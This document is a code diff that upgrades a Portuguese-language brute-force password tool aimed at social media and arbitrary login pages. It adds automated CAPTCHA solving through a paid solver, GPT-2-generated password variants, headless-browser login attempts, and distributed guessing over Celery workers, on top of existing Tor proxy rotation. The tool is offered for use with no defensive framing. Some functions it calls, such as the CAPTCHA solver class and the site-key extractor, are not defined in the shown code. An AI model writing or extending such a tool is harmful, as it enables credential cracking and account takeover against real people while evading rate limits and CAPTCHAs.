@@ -19,13 +19,17 @@ from fake_useragent import UserAgent
 import warnings
 import json
 from pathlib import Path
+from playwright.async_api import async_playwright
+from transformers import pipeline
+from celery import Celery
+from redis import Redis
 
-
+# Configurações iniciais
 warnings.filterwarnings("ignore")
-VERSION = "2.0"
+VERSION = "3.0"
 CONFIG_FILE = "brute_config.json"
 
-
+# Configuração do tema para interface rica
 custom_theme = Theme({
     "success": "bold green",
     "error": "bold red",
@@ -35,6 +39,9 @@ custom_theme = Theme({
     "prompt": "bold magenta"
 })
 console = Console(theme=custom_theme)
+
+# Configuração do Celery para ataque distribuído
+app = Celery('brute_force', broker='redis://localhost:6379/0')
 
 class AttackState:
     def __init__(self):
@@ -46,6 +53,18 @@ class AttackState:
         self.last_proxy_rotation = 0
 
 state = AttackState()
+
+class AIPasswordGenerator:
+    def __init__(self):
+        self.generator = pipeline('text-generation', model='gpt2-medium')
+    
+    def generate(self, base_word):
+        prompts = [
+            f"Variações comuns de senha para {base_word}:",
+            f"Transformações leet speak para {base_word}:",
+            f"Padrões de senha similares a {base_word}:"
+        ]
+        return self.generator(prompts, max_length=50)
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -96,15 +115,17 @@ def menu():
     table.add_row("2. Ataque a URL Customizada")
     table.add_row("3. Configurar Proxy/Tor")
     table.add_row("4. Configurações Avançadas")
-    table.add_row("5. Sair")
+    table.add_row("5. Ataque com Navegador Headless")
+    table.add_row("6. Ataque Distribuído")
+    table.add_row("7. Sair")
     console.print(table)
     
     while True:
         try:
             choice = int(console.input("[prompt]>> [/]"))
-            if 1 <= choice <= 5:
+            if 1 <= choice <= 7:
                 return choice
-            console.print("[error]Opção inválida! Escolha entre 1-5[/]")
+            console.print("[error]Opção inválida! Escolha entre 1-7[/]")
         except ValueError:
             console.print("[error]Entrada inválida! Digite um número.[/]")
 
@@ -160,7 +181,9 @@ def get_target_info():
             console.print("[error]Arquivo não encontrado![/]")
             wordlist_path = None
     
-    return username, min_length, max_length, chars, wordlist_path
+    use_ai = console.input("[prompt]Deseja usar IA para gerar variações de senha? (s/n): [/]").lower() == 's'
+    
+    return username, min_length, max_length, chars, wordlist_path, use_ai
 
 def configure_proxy():
     show_banner()
@@ -277,10 +300,44 @@ def get_headers():
     }
 
 def check_captcha(response):
-    captcha_indicators = ["captcha", "recaptcha", "hcaptcha", "verification", "human verification"]
-    if any(indicator in response.text.lower() for indicator in captcha_indicators):
-        return True
-    return False
+    captcha_indicators = [
+        'recaptcha', 'hcaptcha', 'turnstile',
+        'cloudflare-challenge', 'data-sitekey',
+        'captcha-container', '/captcha/', 'challenge.js'
+    ]
+    return any(ind.lower() in response.text.lower() for ind in captcha_indicators)
+
+def solve_captcha(site_key, url):
+    API_KEY = "SUA_CHAVE_2CAPTCHA"
+    solver = TwoCaptcha(API_KEY)
+    try:
+        result = solver.recaptcha(sitekey=site_key, url=url)
+        return result['code']
+    except Exception as e:
+        console.print(f"[error]Erro no CAPTCHA: {e}[/]")
+        return None
+
+def adaptive_delay(target_url):
+    base_delay = random.uniform(1.5, 3.0)
+    if 'facebook' in target_url or 'linkedin' in target_url:
+        return base_delay * 2
+    return base_delay
+
+async def headless_attack(url, username, password):
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(headless=False)
+        page = await browser.new_page()
+        
+        await page.goto(url)
+        await page.fill('input[name="username"]', username)
+        await page.fill('input[name="password"]', password)
+        
+        submit_selector = 'button:has-text("Log in"), input[type="submit"]'
+        await page.click(submit_selector)
+        
+        if 'dashboard' in page.url or 'home' in page.url:
+            return True
+        return False
 
 def brute_force_worker(url, username, password, timeout=10):
     if state.found:
@@ -290,7 +347,7 @@ def brute_force_worker(url, username, password, timeout=10):
         session = requests.Session()
         headers = get_headers()
         
-        if time.time() - state.last_proxy_rotation > 300:  # 5 minutos
+        if time.time() - state.last_proxy_rotation > 300:
             rotate_tor_proxy()
             state.last_proxy_rotation = time.time()
         
@@ -300,16 +357,26 @@ def brute_force_worker(url, username, password, timeout=10):
         }, headers=headers, timeout=timeout, allow_redirects=True)
         
         if check_captcha(response):
-            console.print("[warning]CAPTCHA detectado! Pausando por 60 segundos...[/]")
-            time.sleep(60)
-            return False
+            console.print("[warning]CAPTCHA detectado! Tentando resolver...[/]")
+            site_key = extract_site_key(response.text)
+            if site_key:
+                captcha_solution = solve_captcha(site_key, url)
+                if captcha_solution:
+                    response = session.post(url, data={
+                        'username': username,
+                        'password': password,
+                        'g-recaptcha-response': captcha_solution
+                    }, headers=headers, timeout=timeout, allow_redirects=True)
+            else:
+                console.print("[warning]Pausando por 60 segundos devido ao CAPTCHA...[/]")
+                time.sleep(60)
+                return False
         
-    
         login_success = (
             "login error" not in response.text.lower() and 
             "invalid" not in response.text.lower() and
             "incorrect" not in response.text.lower() and
-            response.url != url  # Redirecionamento após login
+            response.url != url
         )
         
         with state.lock:
@@ -320,19 +387,22 @@ def brute_force_worker(url, username, password, timeout=10):
                 state.password = password
                 return True
         
-        # Delay aleatório para parecer humano
-        time.sleep(random.uniform(0.1, 0.5))
-        
+        time.sleep(adaptive_delay(url))
         return False
     except Exception as e:
         with state.lock:
             state.attempts += 1
         return False
 
-def generate_passwords(min_len, max_len, chars):
-    for length in range(min_len, max_len + 1):
-        for attempt in product(chars, repeat=length):
-            yield ''.join(attempt)
+def generate_passwords(min_len, max_len, chars, base_word=None, use_ai=False):
+    if use_ai and base_word:
+        ai_gen = AIPasswordGenerator()
+        for variant in ai_gen.generate(base_word):
+            yield variant
+    else:
+        for length in range(min_len, max_len + 1):
+            for attempt in product(chars, repeat=length):
+                yield ''.join(attempt)
 
 def load_wordlist(path):
     try:
@@ -357,14 +427,14 @@ def show_stats():
         return True
     return False
 
-def start_brute_force(url, username, min_len, max_len, chars, wordlist_path=None):
+def start_brute_force(url, username, min_len, max_len, chars, wordlist_path=None, use_ai=False):
     state.__init__()  # Resetar estado
     
     console.print(f"\n[header]Iniciando ataque de força bruta em {url}[/]")
     console.print(f"[info]Alvo: {username}[/]")
     console.print(f"[info]Intervalo de senhas: {min_len}-{max_len} caracteres[/]")
     
-    password_generator = load_wordlist(wordlist_path) if wordlist_path else generate_passwords(min_len, max_len, chars)
+    password_generator = load_wordlist(wordlist_path) if wordlist_path else generate_passwords(min_len, max_len, chars, username, use_ai)
     
     with Progress(
         TextColumn("[progress.description]{task.description}"),
@@ -386,15 +456,34 @@ def start_brute_force(url, username, min_len, max_len, chars, wordlist_path=None
                 if len(futures) % 100 == 0:
                     progress.update(task, description=f"[cyan]Testando senhas... {state.attempts} tentativas")
                     
-                    # Mostrar estatísticas
                     if show_stats():
                         break
             
-            # Esperar todas as threads completarem
             for future in futures:
                 future.result()
     
     show_stats()
+
+@app.task
+def distributed_attack(node_id, url, username, password_batch):
+    results = {}
+    for pwd in password_batch:
+        if brute_force_worker(url, username, pwd):
+            results['success'] = pwd
+            break
+    return results
+
+def start_distributed_attack(url, username, min_len, max_len, chars):
+    console.print("[header]Iniciando ataque distribuído...[/]")
+    
+    passwords = list(generate_passwords(min_len, max_len, chars))
+    batch_size = 1000
+    batches = [passwords[i:i+batch_size] for i in range(0, len(passwords), batch_size)]
+    
+    for i, batch in enumerate(batches):
+        distributed_attack.delay(i, url, username, batch)
+    
+    console.print("[success]Tarefas distribuídas para workers![/]")
 
 def advanced_settings():
     show_banner()
@@ -405,8 +494,9 @@ def advanced_settings():
     console.print("1. Configurar tempo máximo de tentativa")
     console.print("2. Configurar delay entre tentativas")
     console.print("3. Configurar número de threads")
-    console.print("4. Limpar configurações salvas")
-    console.print("5. Voltar")
+    console.print("4. Configurar solver de CAPTCHA")
+    console.print("5. Limpar configurações salvas")
+    console.print("6. Voltar")
     
     choice = int(console.input("[prompt]Escolha: [/]"))
     
@@ -424,6 +514,10 @@ def advanced_settings():
         config["threads"] = threads
         console.print(f"[success]Número de threads configurado para {threads}[/]")
     elif choice == 4:
+        api_key = console.input("[prompt]Chave API do 2Captcha: [/]")
+        config["captcha_api"] = api_key
+        console.print("[success]API de CAPTCHA configurada![/]")
+    elif choice == 5:
         try:
             os.remove(CONFIG_FILE)
             console.print("[success]Configurações removidas![/]")
@@ -444,8 +538,8 @@ def main():
                     continue
                 
                 url = get_social_media_url(sm_choice)
-                username, min_len, max_len, chars, wordlist_path = get_target_info()
-                start_brute_force(url, username, min_len, max_len, chars, wordlist_path)
+                username, min_len, max_len, chars, wordlist_path, use_ai = get_target_info()
+                start_brute_force(url, username, min_len, max_len, chars, wordlist_path, use_ai)
                 
                 if not state.found:
                     console.print("[error]Ataque concluído - senha não encontrada[/]")
@@ -453,8 +547,8 @@ def main():
             
             elif choice == 2:
                 url = console.input("[prompt]Digite a URL de login: [/]")
-                username, min_len, max_len, chars, wordlist_path = get_target_info()
-                start_brute_force(url, username, min_len, max_len, chars, wordlist_path)
+                username, min_len, max_len, chars, wordlist_path, use_ai = get_target_info()
+                start_brute_force(url, username, min_len, max_len, chars, wordlist_path, use_ai)
                 
                 if not state.found:
                     console.print("[error]Ataque concluído - senha não encontrada[/]")
@@ -467,6 +561,25 @@ def main():
                 advanced_settings()
             
             elif choice == 5:
+                url = console.input("[prompt]Digite a URL de login: [/]")
+                username = console.input("[prompt]Digite o nome de usuário: [/]")
+                password = console.input("[prompt]Digite a senha para testar: [/]")
+                
+                import asyncio
+                success = asyncio.run(headless_attack(url, username, password))
+                if success:
+                    console.print("[success]Login bem-sucedido no modo headless![/]")
+                else:
+                    console.print("[error]Falha no login[/]")
+                input("\n[prompt]Pressione Enter para continuar...[/]")
+            
+            elif choice == 6:
+                url = console.input("[prompt]Digite a URL de login: [/]")
+                username, min_len, max_len, chars, _, _ = get_target_info()
+                start_distributed_attack(url, username, min_len, max_len, chars)
+                input("\n[prompt]Pressione Enter para continuar...[/]")
+            
+            elif choice == 7:
                 console.print("[header]Saindo... Até a próxima![/]")
                 time.sleep(2)
                 break
@@ -476,7 +589,7 @@ def main():
     except Exception as e:
         console.print(f"[error]Erro fatal: {str(e)}[/]")
     finally:
-        socks.set_default_proxy()  # Limpar configurações de proxy
+        socks.set_default_proxy()
 
 if __name__ == "__main__":
     main()
